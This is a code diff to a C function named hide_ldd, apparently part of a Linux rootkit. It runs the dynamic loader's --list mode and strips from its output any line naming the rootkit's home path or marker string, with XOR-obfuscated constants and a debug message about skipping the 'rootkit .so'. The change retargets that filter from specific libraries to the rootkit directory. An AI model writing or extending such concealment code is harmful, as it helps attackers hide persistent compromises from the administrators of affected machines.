@@ -3,20 +3,20 @@
 void hide_ldd(char **argv) {
     DEBUG_MSG("[-] hide_ldd called\n");
         
-    int i = 0;
-    while (argv[i] != NULL) {
-        DEBUG_MSG("argv: %s\n", argv[i]);
-        i++;
-    }
+    // int i = 0;
+    // while (argv[i] != NULL) {
+    //     DEBUG_MSG("argv: %s\n", argv[i]);
+    //     i++;
+    // }
 	char buf[4096];
 	char cmd[8192];
 	FILE *fp;
 	char *p, *p2;
     
-    char *ld_linux_so = strdup(LD_LINUX_SO_PATH); xor(ld_linux_so);
-    char *libzpoline = strdup(LIBZPOLINE); xor(libzpoline);
-    char *libopcodes = strdup(LIBOPCODES); xor(libopcodes);
     char *hidden_str = strdup(HIDDEN_STR); xor(hidden_str);
+    char *rk_home = strdup(RK_HOME); xor(rk_home);
+    char *ld_linux_so = strdup(LD_LINUX_SO_PATH); xor(ld_linux_so);
+
     sprintf(cmd, "%s --list %s", ld_linux_so, argv[1]);
     DEBUG_MSG("[-] cmd: %s\n", cmd);
 
@@ -29,7 +29,7 @@ void hide_ldd(char **argv) {
 
 	while ((p2=strchr(p, '\n'))) {
 		*p2 = 0;
-		if (strstr(p, libzpoline) || strstr(p, libopcodes) || strstr(p, hidden_str)) {
+		if (strstr(p, rk_home) || strstr(p, hidden_str)) {
             DEBUG_MSG("[!] Skipping entry containing rootkit .so\n");
 			p = p2+1;
 			continue;
@@ -40,8 +40,7 @@ void hide_ldd(char **argv) {
 
     // cleanup 
     CLEAN(hidden_str);
+    CLEAN(rk_home);
     CLEAN(ld_linux_so);
-    CLEAN(libzpoline);
-    CLEAN(libopcodes);
 	exit(0);
 }
